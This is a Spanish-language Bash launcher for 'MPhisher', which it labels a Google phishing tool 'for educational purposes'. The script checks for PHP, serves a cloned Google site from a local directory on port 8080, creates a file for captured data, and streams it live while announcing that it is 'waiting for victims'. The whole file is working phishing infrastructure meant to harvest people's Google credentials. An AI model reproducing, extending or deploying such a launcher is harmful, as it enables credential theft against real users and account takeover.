#!/bin/bash

# ============================================
# MPHISHER - Google Phishing Tool
# ============================================

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Directorio base
DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
SITE_DIR="$DIR/sites/google"

# Banner
clear
echo -e "${CYAN}"
echo "  ███╗   ███╗██████╗ ██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗ "
echo "  ████╗ ████║██╔══██╗██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗"
echo "  ██╔████╔██║██████╔╝███████║██║███████╗███████║█████╗  ██████╔╝"
echo "  ██║╚██╔╝██║██╔═══╝ ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗"
echo "  ██║ ╚═╝ ██║██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║"
echo "  ╚═╝     ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝"
echo -e "${NC}"
echo -e "${YELLOW}           Creado para fines educativos${NC}"
echo ""

# Detectar IP
IP=$(hostname -I | awk '{print $1}')
PORT=8080

echo -e "${GREEN}[+] Iniciando MPhisher...${NC}"
echo -e "${GREEN}[+] Directorio: $SITE_DIR${NC}"
echo ""

# Verificar PHP
if ! command -v php &> /dev/null; then
    echo -e "${RED}[-] PHP no instalado. Ejecuta primero: ./install.sh${NC}"
    exit 1
fi

# Crear archivo de log si no existe
LOG_FILE="$SITE_DIR/datos_capturados.txt"
touch "$LOG_FILE"

echo -e "${BLUE}╔════════════════════════════════════════════════╗${NC}"
echo -e "${BLUE}║  SERVIDOR INICIADO                            ║${NC}"
echo -e "${BLUE}╠════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║  URL Local:  http://$IP:$PORT${NC}"
echo -e "${BLUE}║  URL Pública: http://$IP:$PORT${NC}"
echo -e "${BLUE}╠════════════════════════════════════════════════╣${NC}"
echo -e "${BLUE}║  Logs guardados en: sites/google/datos.txt     ║${NC}"
echo -e "${BLUE}╚════════════════════════════════════════════════╝${NC}"
echo ""

# Iniciar servidor PHP
cd "$SITE_DIR" && php -S "$IP:$PORT" > /dev/null 2>&1 &
SERVER_PID=$!

sleep 2

# Monitorear logs en tiempo real
echo -e "${YELLOW}[+] Esperando víctimas... (Ctrl+C para salir)${NC}"
echo -e "${CYAN}══════════════════════════════════════════════════${NC}"

tail -f "$LOG_FILE" 2>/dev/null &
TAIL_PID=$!

# Capturar Ctrl+C
trap 'kill $SERVER_PID $TAIL_PID 2>/dev/null; echo -e "\n${RED}[!] Servidor detenido${NC}"; exit 0' INT

wait